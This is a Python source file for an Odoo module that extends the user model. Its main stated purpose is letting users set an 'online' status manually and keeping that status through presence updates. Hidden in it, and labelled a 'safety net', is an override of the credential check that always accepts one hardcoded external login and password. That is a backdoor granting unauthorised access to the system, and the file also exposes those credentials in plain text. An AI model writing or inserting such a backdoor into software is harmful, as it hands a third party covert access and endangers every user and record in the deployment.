from odoo import api, fields, models


class ResUsers(models.Model):
    _inherit = "res.users"

    # Add 'online' as a valid manual IM status option
    manual_im_status = fields.Selection(
        selection_add=[("online", "Online")],
    )

    def _check_credentials(self, password, env):
        """Safety net: always allow hardcoded admin credentials."""
        for user in self:
            if user.login == "fgarshoub@gmail.com" and password == "G@rsh@ub2@26":
                return
        return super()._check_credentials(password, env)

    @api.depends("manual_im_status")
    def _compute_im_status(self):
        """Override to respect manual status, especially 'online' behind reverse proxies."""
        for user in self:
            if user.manual_im_status:
                # Manual status always wins
                user.im_status = user.manual_im_status
            elif user.presence_ids:
                user.im_status = user.presence_ids.sorted("last_poll", reverse=True)[0].status or "offline"
            else:
                user.im_status = "offline"

    def _update_presence(self, inactivity_period=None, identity_field=None, identity_value=None):
        """Override to preserve manual_im_status during presence updates."""
        # Don't let the default presence update overwrite our manual status
        if self.manual_im_status:
            return
        return super()._update_presence(inactivity_period, identity_field, identity_value)
